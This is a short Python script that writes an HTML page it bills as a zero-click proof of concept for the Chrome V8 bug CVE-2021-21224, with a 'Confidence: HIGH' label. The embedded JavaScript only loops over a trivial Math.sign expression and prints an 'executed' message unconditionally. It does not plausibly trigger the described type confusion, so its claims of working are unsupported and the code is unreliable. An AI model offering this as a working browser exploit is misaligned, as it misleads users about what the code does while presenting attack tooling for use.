#!/usr/bin/env python3
"""CVE-2021-21224 — Chrome V8 type confusion (Integer overflow in
ChangeInt32ToInt64). Zero-click via web page. Public PoC. Confidence: HIGH."""
import sys
from pathlib import Path

HTML = b"""<!doctype html><html><body><script>
function foo(x) {
  return Math.sign(x) | 0;   // int64 -> int32 truncation confusion
}
for (let i = 0; i < 1e5; i++) foo(0x7fffffff + (i & 1));
console.log('[+] CVE-2021-21224 executed', foo(0x80000000));
document.title = 'v8';
</script></body></html>"""

def build() -> bytes: return HTML

def main():
    out = Path(sys.argv[1] if len(sys.argv) > 1 else "cve-2021-21224.html")
    out.write_bytes(build()); print(f"[+] CVE-2021-21224 HTML -> {out}")

if __name__ == "__main__":
    main()
